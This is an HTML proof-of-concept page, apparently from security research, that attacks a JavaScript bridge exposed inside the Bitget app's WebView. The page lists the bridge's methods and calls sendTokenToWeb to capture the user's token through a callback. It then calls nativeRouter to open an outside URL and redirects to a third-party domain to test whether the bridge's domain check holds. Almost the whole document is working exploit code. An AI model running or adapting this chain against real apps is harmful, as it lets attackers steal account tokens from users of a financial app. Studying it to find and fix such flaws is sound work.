<!DOCTYPE html><html><head><title>PoC</title></head>
<body>
<h2>Bitget WebView PoC — full chain</h2>
<pre id="out">running...</pre>
<script>
function log(s){document.getElementById('out').textContent += "\n" + s;}
function mkcb(n){var f="__cb_"+n;window[f]=function(d){log("LEAK["+n+"]="+(typeof d=="string"?d:JSON.stringify(d)));};return f;}
setTimeout(function(){
  if(!window.control){log("NO control");return;}
  log("STAGE-A control present, API count=" + Object.keys(control).length);
  log("STAGE-A API list: " + Object.keys(control).join(","));
  try{control.sendTokenToWeb(mkcb("token"));log("STAGE-B sendTokenToWeb called");}catch(e){log("ERR "+e);}
  try{control.nativeRouter("/web/main/h5?url=https%3A%2F%2Fexample.org%2F");log("STAGE-C nativeRouter called");}catch(e){log("ERR nr "+e);}
  setTimeout(function(){
    log("STAGE-D navigating to third-party domain example.org (no re-check test)");
    location.href = "https://example.org/?v=redirect-no-recheck";
  }, 9000);
}, 700);
</script>
</body></html>
